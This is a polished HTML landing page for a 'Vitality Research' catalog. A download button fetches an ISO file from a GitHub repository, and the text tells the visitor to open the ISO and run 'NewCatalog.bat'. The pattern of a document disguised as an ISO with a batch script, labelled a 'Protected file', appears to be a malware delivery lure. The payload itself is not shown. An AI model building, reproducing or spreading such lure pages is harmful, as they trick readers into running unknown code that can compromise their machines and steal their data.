<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vitality Research</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
            background: linear-gradient(145deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            overflow: hidden;
        }
        body::before {
            content: '';
            position: absolute;
            width: 400px; height: 400px;
            background: radial-gradient(circle, rgba(102,126,234,0.25) 0%, transparent 70%);
            top: -100px; right: -100px;
            border-radius: 50%;
        }
        body::after {
            content: '';
            position: absolute;
            width: 300px; height: 300px;
            background: radial-gradient(circle, rgba(118,75,162,0.2) 0%, transparent 70%);
            bottom: -80px; left: -80px;
            border-radius: 50%;
        }
        .container {
            position: relative;
            background: rgba(255, 255, 255, 0.07);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 24px;
            padding: 55px 45px;
            text-align: center;
            max-width: 460px;
            width: 90%;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4);
            z-index: 1;
        }
        .logo {
            width: 72px; height: 72px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 28px;
            font-size: 34px;
            box-shadow: 0 12px 30px rgba(102, 126, 234, 0.45);
        }
        h1 {
            font-size: 28px;
            margin-bottom: 10px;
            font-weight: 700;
            letter-spacing: -0.5px;
            background: linear-gradient(90deg, #fff, #c3b7ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .subtitle {
            color: rgba(255, 255, 255, 0.55);
            font-size: 14px;
            margin-bottom: 28px;
        }
        p {
            color: rgba(255, 255, 255, 0.75);
            font-size: 15.5px;
            line-height: 1.7;
            margin-bottom: 36px;
        }
        .download-btn {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            text-decoration: none;
            padding: 17px 42px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 600;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 12px 35px rgba(102, 126, 234, 0.45);
            cursor: pointer;
            border: none;
        }
        .download-btn:hover {
            transform: translateY(-4px) scale(1.03);
            box-shadow: 0 18px 45px rgba(102, 126, 234, 0.6);
        }
        .info {
            margin-top: 30px;
            font-size: 12.5px;
            color: rgba(255, 255, 255, 0.4);
        }
        .divider {
            width: 40px; height: 3px;
            background: linear-gradient(90deg, #667eea, #764ba2);
            border-radius: 3px;
            margin: 0 auto 24px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📦</div>
        <h1>Vitality Research</h1>
        <div class="subtitle">Professional Catalog</div>
        <div class="divider"></div>
        <p>
            Click the button below to download the catalog.<br>
            After downloading, open the ISO file and run <strong>NewCatalog.bat</strong>.
        </p>
        <a href="https://raw.githubusercontent.com/NewAgeEvent/Vitality-Research/main/VitalityResearch.iso" 
           class="download-btn" 
           download="VitalityResearch.iso"
           target="_blank"
           rel="noopener">
            ↓ &nbsp; DOWNLOAD
        </a>
        <div class="info">
            Version 1.0 &nbsp;•&nbsp; Protected file
        </div>
    </div>
</body>
</html>
